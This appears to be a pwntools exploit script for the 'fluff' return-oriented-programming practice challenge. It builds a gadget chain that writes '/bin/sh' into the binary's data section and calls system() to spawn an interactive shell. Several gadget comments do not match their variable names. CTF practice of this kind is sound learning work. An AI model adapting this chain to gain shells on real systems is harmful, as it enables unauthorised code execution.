#!/usr/bin/env python

from pwn import *

p = process("./fluff")
#p = remote("127.0.0.1", 6666)
context.arch = 'amd64'
p.recvuntil('>')


# Useful address
system_plt = p64(0x4005e0);
data_addr = p64(0x601050);

# Gadgets
xor_r11_r11 = p64(0x400822) # pop r14; mov edi,"data_section"; ret
xor_r11_r12 = p64(0x0040082f) # pop r12; mov r13d,junk; ret
#pop_r12 = p64(0x00400853) # xor b[r10],r12b; ret
pop_r12 = p64(0x00400832)
xchg_r11_r10 = p64(0x00400840) # pop r15; mov r11d,junk; ret
mov_qlr10_r11 = p64(0x0040084e) # pop r13; pop r12; xor b[r10]
#,r12b; ret

def write_data(data, addr):
    # Stage 1: write data_addr into r10
    buf = ""
    buf += xor_r11_r11
    buf += p64(0)  # get rid of pop r14
    buf += pop_r12
    buf += addr
    buf += xor_r11_r12
    buf += p64(0) # get rid of pop r12
    buf += xchg_r11_r10
    buf += p64(0) # get rid of pop r15
    # Stage 2: write '/bin/sh\x00' into data_addr
    buf += xor_r11_r11
    buf += p64(0)
    buf += pop_r12
    buf += data
    buf += xor_r11_r12
    buf += p64(0)
    buf += mov_qlr10_r11
    buf += p64(0)
    buf += p64(0)
    # We don't need to adjust rdi because of the gadget xor_r11_r11
    return buf

payload = "A"*40
payload += write_data("/bin/sh\x00", data_addr)
payload += system_plt

log.info("Sending payload length: %d" % len(payload))
p.sendline(payload)
p.interactive()
